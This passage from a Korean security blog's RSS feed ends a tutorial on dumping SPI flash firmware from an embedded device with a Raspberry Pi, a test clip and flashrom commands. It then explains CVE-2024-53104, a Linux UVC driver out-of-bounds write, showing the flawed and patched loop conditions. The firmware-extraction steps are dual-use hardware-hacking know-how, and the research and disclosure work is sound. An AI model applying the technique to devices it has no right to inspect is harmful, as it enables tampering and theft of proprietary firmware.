Protect, &#xC4F0;&#xAE30; &#xBCF4;&#xD638;<ul><li>&#xC774; &#xD540; &#xC2E0;&#xD638;&#xAC00; &#xD65C;&#xC131;&#xD654; &#xB41C; &#xACBD;&#xC6B0; Flash memory&#xB85C; &#xC4F0;&#xAE30; &#xBD88;&#xAC00;</li></ul></li><li>Hold: Chip &#xC77C;&#xC2DC; &#xC815;&#xC9C0;<ul><li>&#xC774; &#xD540; &#xC2E0;&#xD638;&#xAC00; &#xD65C;&#xC131;&#xD654; &#xB41C; &#xACBD;&#xC6B0; Flash memory &#xB3D9;&#xC791;&#xC774; &#xBA48;&#xCDA4;</li></ul></li></ul><p>Raspberry Pi&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; GPIO &#xD540;&#xACFC; Flash Memory&#xC758; Pin&#xC744; &#xC5F0;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Flash Memory&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; VCC, Hold, WP &#xD540;&#xC740; VCC &#xC804;&#xC6D0;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD540;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Raspberry Pi GPIO &#xD540;&#xC5D0;&#xB294; VCC &#xD540;&#xC774; &#xBD80;&#xC871;&#xD558;&#xBBC0;&#xB85C; &#xBE0C;&#xB808;&#xB4DC; &#xBCF4;&#xB4DC; &#xB4F1;&#xC73C;&#xB85C; VCC &#xC2E0;&#xD638;&#xB97C; &#xACF5;&#xAE09;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD3B8;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image6.jpg" alt></p><p>IC Test Hook Chip &#xC7A5;&#xBE44;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xAC01; &#xD540;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xACE0; &#xCD94;&#xCD9C;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC587;&#xC740; Clip&#xC77C;&#xC218;&#xB85D; &#xC5F0;&#xACB0;&#xC774; &#xC27D;&#xAE30;&#xC5D0; &#xC587;&#xC740; Test Clip&#xC73C;&#xB85C; &#xC900;&#xBE44;&#xD558;&#xBA74; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image7.png" alt></p><h2 id="4-Flash-memory-dump"><a href="#4-Flash-memory-dump" class="headerlink" title="4. Flash memory dump"></a>4. Flash memory dump</h2><p>&#xC5F0;&#xACB0;&#xC774; &#xC644;&#xB8CC;&#xB418;&#xBA74; Raspberry Pi &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xCD94;&#xCD9C;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#x1F489;</p><pre><code class="hljs bash"><span class="hljs-comment"># &#xC5F0;&#xACB0; &#xD655;&#xC778; &#xBC0F; Chip &#xBA85; &#xD655;&#xC778;</span>sudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=2000 -V<span class="hljs-comment"># &#xCD94;&#xCD9C;</span>sudo flashrom -p linux_spi:dev=/dev/spidev0.0 -r [&#xC800;&#xC7A5;&#xD30C;&#xC77C;&#xBA85;]sudo flashrom -p linux_spi:dev=/dev/spidev0.0 -c [Chip&#xBA85;] -r [&#xC800;&#xC7A5;&#xD30C;&#xC77C;&#xBA85;]</code></pre><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image8.png" alt></p><p>flashrom&#xC740; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Chip&#xC778; &#xACBD;&#xC6B0; &#xBC14;&#xB85C; &#xCD94;&#xCD9C;&#xC774; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294; Chip&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>flashchips.h</code>, <code>flashchips.c</code>&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;, &#xC9C1;&#xC811; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xBE4C;&#xB4DC;&#xD558;&#xBA74; &#xCD94;&#xCD9C;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Datasheet&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC5EC; &#xC544;&#xB798; flashchips.c &#xD30C;&#xC77C;&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xB824;&#xB294; Chip&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xC785;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">flashchip</span> <span class="hljs-title">flashchips</span>[] = {</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * .vendor= Vendor name</span><span class="hljs-comment"> * .name= Chip name</span><span class="hljs-comment"> * .bustype= Supported flash bus types (Parallel, LPC...)</span><span class="hljs-comment"> * .manufacture_id= Manufacturer chip ID</span><span class="hljs-comment"> * .model_id= Model chip ID</span><span class="hljs-comment"> * .total_size= Total size in (binary) kbytes</span><span class="hljs-comment"> * .page_size= Page or eraseblock(?) size in bytes</span><span class="hljs-comment"> * .tested= Test status</span><span class="hljs-comment"> * .probe= Probe function</span><span class="hljs-comment"> * .probe_timing= Probe function delay</span><span class="hljs-comment"> * .block_erasers[]= Array of erase layouts and erase functions</span><span class="hljs-comment"> * {</span><span class="hljs-comment"> *.eraseblocks[]= Array of { blocksize, blockcount }</span><span class="hljs-comment"> *.block_erase= Block erase function</span><span class="hljs-comment"> * }</span><span class="hljs-comment"> * .printlock= Chip lock status function</span><span class="hljs-comment"> * .unlock= Chip unlock function</span><span class="hljs-comment"> * .write= Chip write function</span><span class="hljs-comment"> * .read= Chip read function</span><span class="hljs-comment"> * .voltage= Voltage range in millivolt</span><span class="hljs-comment"> */</span></code></pre><p>&#xC704; &#xACFC;&#xC815;&#xC73C;&#xB85C; Flash memory dump&#xB97C; &#xC2E4;&#xC2DC;&#xD558;&#xC5EC; Chip &#xB0B4;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; Firmware&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>Flash Memory Chip off &#xC774;&#xD6C4;&#xC5D0;&#xB294; Chip&#xC774; &#xB5A8;&#xC5B4;&#xC838; &#xC788;&#xAE30;&#xC5D0; &#xC7A5;&#xBE44;&#xB97C; &#xC4F0;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;&#x2026;</p><p>&#xD558;&#xC9C0;&#xB9CC;! &#xC870;&#xB9BD;&#xC740; &#xBD84;&#xD574;&#xC758; &#xC5ED;&#xC21C;&#xC785;&#xB2C8;&#xB2E4;!</p><p>Flash Memory Chip&#xC744; &#xB2E4;&#xC2DC; &#xC798;(!) Resoldering&#xD558;&#xBA74; &#xC7A5;&#xBE44;&#xB97C; &#xB2E4;&#xC2DC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xB3C4; &#xD68D;&#xB4DD;&#xD558;&#xACE0; &#xC7A5;&#xBE44;&#xB3C4; &#xB2E4;&#xC2DC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xB450; &#xB9C8;&#xB9AC; &#xD1A0;&#xB07C;&#xB97C; &#xBAA8;&#xB450; &#xC7A1;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;! &#x1F925;</p><p><img src="/2025/03/09/newp1ayer48/flashrom/ko/image9.png" alt></p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC2DC;&#xB3C4;&#xB418;&#xB294; UART/JTAG &#xB514;&#xBC84;&#xAE45; &#xD3EC;&#xD2B8; &#xC5F0;&#xACB0;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F64F;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/IoT/">IoT</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/09/newp1ayer48/flashrom/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-53104: Linux Kernel의 Out-Of-Bounds(OOB) Write 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/08/j0ker/2025-03-08/</link>
      <guid>https://hackyboiz.github.io/2025/03/08/j0ker/2025-03-08/</guid>
      <pubDate>Sat, 08 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2024-53104&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53104">https://nvd.nist.gov/vuln/detail/CVE-2024-53104</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; UVC (USB Video Class) &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>uvc_parse_format</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xD504;&#xB808;&#xC784; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xB97C; &#xD30C;&#xC2F1;&#xD560; &#xB54C;, &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB808;&#xC784; &#xD0C0;&#xC785;(&#xC608;, UVC_VS_UNDEFINED, &#xC2E4;&#xC81C; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; <code>ftype</code>&#xC774; 0&#xC778; &#xACBD;&#xC6B0;)&#xC744; &#xC81C;&#xB300;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; Out-Of-Bounds Write&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xD328;&#xCE58; &#xC804; &#xCF54;&#xB4DC;</strong></p><ul><li><p>&#xD504;&#xB808;&#xC784; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; while &#xB8E8;&#xD504;&#xC758; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p>  <pre><code class="hljs c"><span class="hljs-keyword">while</span> (buflen &gt; <span class="hljs-number">2</span> &amp;&amp; buffer[<span class="hljs-number">1</span>] == USB_DT_CS_INTERFACE &amp;&amp;       buffer[<span class="hljs-number">2</span>] == ftype) {    <span class="hljs-comment">// &#xD504;&#xB808;&#xC784; &#xD30C;&#xC2F1; &#xCC98;&#xB9AC;...</span>}</code></pre><p>  <code>ftype</code>&#xC740; &#xD30C;&#xC2F1;&#xD560; &#xD504;&#xB808;&#xC784;&#xC758; &#xD0C0;&#xC785;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, UVC_VS_FRAME_UNCOMPRESSED, UVC_VS_FRAME_FRAME_BASED, UVC_VS_FRAME_MJPEG &#xB4F1;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xD2B9;&#xC815; &#xD3EC;&#xB9F7;(&#xC608;: DV &#xD3EC;&#xB9F7;)&#xC758; &#xACBD;&#xC6B0; <code>ftype</code>&#xC744; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB294; &#xC2E4;&#xC81C; &#xD504;&#xB808;&#xC784; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xBB38;&#xC81C;&#xB294; &#xB9CC;&#xC57D; <code>ftype</code> &#xAC12;&#xC774; 0(&#xC989;, UVC_VS_UNDEFINED)&#xC774;&#xBA74;, &#xC870;&#xAC74; <code>buffer[2] == 0</code>&#xC774; &#xCC38;&#xC774; &#xB418;&#xC5B4; &#xB8E8;&#xD504;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0;, &#xACC4;&#xC0B0;&#xB41C; &#xD504;&#xB808;&#xC784; &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xAC00; &#xBD80;&#xC815;&#xD655;&#xD574;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ul></li></ul><p>&#xD328;&#xCE58; &#xC804;&#xC5D0;&#xB294; <code>ftype</code>&#xC774; 0&#xC778; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB3C4; &#xB8E8;&#xD504;&#xAC00; &#xC870;&#xAC74;&#xC5D0; &#xB9DE;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xC5B4;, &#xD504;&#xB808;&#xC784; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130;&#xC758; &#xD06C;&#xAE30;&#xB098; &#xBC84;&#xD37C; &#xACC4;&#xC0B0;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB808;&#xC784; &#xD0C0;&#xC785;&#xC5D0; &#xB300;&#xD574; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACE0;, &#xBC84;&#xD37C;&#xC758; OOB Write&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC704;&#xD5D8;&#xC774; &#xC0DD;&#xAE41;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD560; &#xACBD;&#xC6B0;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC548;&#xC815;&#xC131;&#xC744; &#xD574;&#xCE58;&#xAC70;&#xB098;, &#xC2EC;&#xAC01;&#xD55C; &#xACBD;&#xC6B0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xB4F1; &#xCE58;&#xBA85;&#xC801;&#xC778; &#xBCF4;&#xC548; &#xBB38;&#xC81C;&#xB97C; &#xC77C;&#xC73C;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xD328;&#xCE58; &#xD6C4; &#xCF54;&#xB4DC;</strong></p><ul><li><p>while &#xB8E8;&#xD504;&#xC758; &#xC870;&#xAC74;&#xC5D0; <code>ftype</code> &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xAC00; &#xAC80;&#xC99D;(<code>ftype &amp;&amp;</code>)&#xC774; &#xB4E4;&#xC5B4;&#xAC14;&#xC2B5;&#xB2C8;&#xB2E4;:</p>  <pre><code class="hljs c"><span class="hljs-keyword">while</span> (ftype &amp;&amp; buflen &gt; <span class="hljs-number">2</span> &amp;&amp; buffer[<span class="hljs-number">1</span>] == USB_DT_CS_INTERFACE &amp;&amp;       buffer[<span class="hljs-number">2</span>] == ftype) {    <span class="hljs-comment">// &#xD504;&#xB808;&#xC784; &#xD30C;&#xC2F1; &#xCC98;&#xB9AC;...</span>}</code></pre></li><li><p>&#xC774;&#xB85C;&#xC368; <code>ftype</code>&#xC774; 0&#xC778; &#xACBD;&#xC6B0;(&#xC989;, &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD504;&#xB808;&#xC784; &#xD0C0;&#xC785;)&#xC5D0;&#xB294; &#xB8E8;&#xD504;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC544;, &#xC798;&#xBABB;&#xB41C; &#xD30C;&#xC2F1;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul></li></ul><p>&#xD328;&#xCE58;&#xC5D0;&#xC11C;&#xB294; while &#xB8E8;&#xD504;&#xC758; &#xC870;&#xAC74;&#xC5D0; <code>ftype</code> &#xAC80;&#xC99D;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC;, <code>ftype</code> &#xAC12;&#xC774; 0(&#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;)&#xC778; &#xACBD;&#xC6B0; &#xD504;&#xB808;&#xC784; &#xB514;&#xC2A4;&#xD06C;&#xB9BD;&#xD130; &#xD30C;&#xC2F1;&#xC744; &#xC544;&#xC608; &#xAC74;&#xB108;&#xB6F0;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBCC0;&#xACBD;&#xC744; &#xD1B5;&#xD574;, &#xC798;&#xBABB;&#xB41C; &#xD504;&#xB808;&#xC784; &#xD0C0;&#xC785;(&#xC608;, UVC_VS_UNDEFINED)&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xBC84;&#xD37C; &#xD06C;&#xAE30; &#xACC4;&#xC0B0; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xB530;&#xB77C;&#xC11C; &#xBC84;&#xD37C;&#xC758; OOB Write&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC744; &#xBBF8;&#xC5F0;&#xC5D0; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xC5FC; &#xBC0F; &#xC545;&#xC758;&#xC801; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC758; &#xC704;&#xD5D8;&#xC774; &#xD06C;&#xAC8C; &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Linux/">Linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kernel/">Kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-53104/">CVE-2024-53104</category>
      
      <category domain="https://hackyboiz.github.io/tags/Out-Of-Bounds/">Out-Of-Bounds</category>
      
      <category domain="https://hackyboiz.github.io/tags/OOB/">OOB</category>
      
      <category domain="https://hackyboiz.github.io/tags/OOB-Write/">OOB Write</category>
      
      <category domain="https://hackyboiz.github.io/tags/uvc-parse-format/">uvc_parse_format</category>
      
      <category domain="https://hackyboiz.github.io/tags/ftype/">ftype</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/08/j0ker/2025-03-08/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
